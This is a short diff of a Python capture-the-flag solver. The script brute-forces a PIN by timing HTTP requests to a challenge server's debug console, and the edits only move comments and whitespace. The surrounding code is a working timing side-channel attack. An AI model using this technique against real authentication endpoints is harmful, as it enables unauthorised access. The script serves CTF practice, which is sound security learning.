@@ -16,7 +16,7 @@ def brutepin(pin):
         payload = {"username": "core", "pin" : pin}
         start = time.time()
         r = requests.get('https://oppnakarnan.cf/debugterminal3/console_346j7.php', params=payload)
-        r.content  # wait until full content has been transfered
+        r.content  
         roundtrip = time.time() - start 
         resp.append(roundtrip)
 
@@ -35,15 +35,11 @@ for y in range(8):
                 p += str(n)
                 brutepin(p)
         p = min(resp)
-        p = resp.index(p)
-        
-# credz to grocid for an awesome challenge
-# grocid.net
-        
-        
+        p = resp.index(p)        
         pin += str(p)
         if testpin(pin) == True:
                 break
+                
 # credz to grocid for an awesome challenge
 # grocid.net
 
